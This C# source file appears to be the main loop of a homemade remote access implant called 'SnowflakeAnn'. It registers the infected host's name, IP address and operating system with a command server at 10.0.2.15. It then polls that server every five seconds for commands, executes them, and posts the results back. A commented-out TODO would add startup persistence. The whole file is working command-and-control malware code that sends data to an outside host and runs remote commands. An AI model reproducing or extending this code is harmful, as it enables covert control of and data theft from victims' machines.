﻿using System;

namespace SnowflakeAnn
{
    class Program
    {
        static void Main(string[] args)
        {
            GeneralInfo infoObject = new GeneralInfo();
            // Console.WriteLine(infoObject.ipv4Address);
            Persistence persistenceObj = new Persistence(infoObject);
            Operations opsObj = new Operations(infoObject);
            // opsObj.CommandParser("download https://google.com/index.html");
            // opsObj.CommandParser("ls C:\\Windowsse");
            // opsObj.CommandParser("ls C:\\Windows");
            // opsObj.CommandParser("dir C:\\");
            // opsObj.CommandParser("ipconfig /all");

            // opsObj.CommandParser("ls");
            // opsObj.CommandParser("dir");

            string commandUrl = "http://10.0.2.15/getcommand.php";
            string registerUrl = "http://10.0.2.15/register.php";
            string getResult = "http://10.0.2.15/getresults.php";
            string commandResult;
            string resultParams;


            System.Net.WebClient webObj = new System.Net.WebClient();
            int exceptionCtr = 0;

            string registerParams = $"hostname={infoObject.hostName}&ip={infoObject.ipv4Address}&operatingsystem={infoObject.oSystem}";

            webObj.Headers.Add("Content-Type", "application/x-www-form-urlencoded");

            webObj.UploadString(registerUrl, registerParams);

            while(true)
            {
                if (exceptionCtr > 19)
                    break;
                    
                try {
                    webObj.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    string receivedCommand = webObj.UploadString(commandUrl, registerParams);
                    if (receivedCommand.Length > 1) 
                    {
                        commandResult = opsObj.CommandParser(receivedCommand);
                        resultParams = $"hostname={infoObject.hostName}&ip={infoObject.ipv4Address}&result={commandResult}";
                        webObj.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                        webObj.UploadString(getResult, resultParams);
                    }
                    
                    System.Threading.Thread.Sleep(5000);
                    exceptionCtr = 0;
                } catch {
                    exceptionCtr++; 
                    System.Threading.Thread.Sleep(5000);
                }
            }





            // TODO: make this persistent now that it works! 
            // persistenceObj.AddToStartup();
        }
    }
}
